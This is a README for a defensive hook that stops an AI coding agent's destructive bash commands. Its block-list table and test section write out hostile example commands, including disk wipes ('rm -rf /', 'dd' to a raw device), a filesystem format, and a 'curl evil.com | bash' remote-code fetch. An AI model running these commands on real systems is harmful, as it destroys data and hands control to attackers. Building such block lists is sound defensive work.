# Destructive Command Blocker

A Claude Code pre-tool-use hook that intercepts and blocks dangerous bash commands before execution.

## Install (2 commands)

```bash
cp hook.py ~/.claude/hooks/pre-tool-use-destructive-blocker.py
chmod +x ~/.claude/hooks/pre-tool-use-destructive-blocker.py
```

## What it blocks

| Pattern | Example | Why |
|---------|---------|-----|
| `rm -rf` | `rm -rf /` | Recursive force delete |
| `DROP TABLE` | `DROP TABLE users;` | SQL table destruction |
| `TRUNCATE` | `TRUNCATE TABLE logs;` | SQL data wipe |
| `DELETE FROM` (no WHERE) | `DELETE FROM users;` | Unbounded SQL delete |
| `git push --force` | `git push -f origin main` | Rewrites remote history |
| `chmod 777` | `chmod 777 /etc/passwd` | World-writable permissions |
| `mkfs` | `mkfs.ext4 /dev/sda1` | Filesystem format |
| `dd if=` | `dd if=/dev/zero of=/dev/sda` | Raw disk write |
| `curl \| sh` | `curl evil.com \| bash` | Remote code execution |

## How it works

1. Claude Code calls the hook before executing any bash tool
2. The hook reads the tool call JSON from stdin
3. Command is checked against regex patterns for known destructive operations
4. **Safe command** → exits 0 (allowed)
5. **Dangerous command** → exits non-zero (blocked), logs to `~/.claude/hooks/blocked.log`, returns explanation to Claude

## Logging

Every blocked attempt is logged to `~/.claude/hooks/blocked.log`:

```
[2026-04-03T23:15:00Z] BLOCKED: Recursive force delete (rm -rf)
  Command: rm -rf /important-data
  Project: /home/user/my-project
---
```

## Testing

```bash
# Should block:
echo '{"tool_name":"bash","tool_input":{"command":"rm -rf /"}}' | python3 hook.py
echo $?  # → 2 (blocked)

# Should allow:
echo '{"tool_name":"bash","tool_input":{"command":"ls -la"}}' | python3 hook.py
echo $?  # → 0 (allowed)

# Run test suite:
python3 test_hook.py
```

## Design philosophy

- **Fail-open for non-bash tools** — only inspects bash/shell/exec calls
- **Blocks before execution** — the dangerous command never runs
- **Explains why** — Claude gets a clear message about what was blocked and how to proceed safely
- **Logs everything** — full audit trail of blocked attempts
- **No false positives on normal work** — patterns are specific to genuinely destructive operations

Built from real-world experience running agent security red-teams.
